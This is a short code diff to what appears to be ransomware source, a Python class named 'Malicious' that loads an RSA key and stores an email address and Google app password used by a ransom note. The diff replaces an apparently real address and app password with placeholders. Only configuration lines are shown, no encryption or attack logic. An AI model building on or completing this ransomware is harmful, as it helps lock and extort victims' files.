@@ -38,8 +38,8 @@ class Malicious:
         self.__public_key = RSA.import_key(extern_key=public_key)
         self.enc_key = "symmetric_key.pem"
         self.file_system = None
-        self.mail = "decryptfiles4@gmail.com"  # Change This to your Email Its also accessed  in ransomNote
-        self.ml_pswd = "fjbfxxtcexvudupu"  # Change This [App Password Google app password for more information]
+        self.mail = "****@gmail.com"  # Change This to your Email Its also accessed  in ransomNote
+        self.ml_pswd = ""  # Change This [App Password Google app password for more information]
         self.server = None
 
     # Generation of symmetric Key
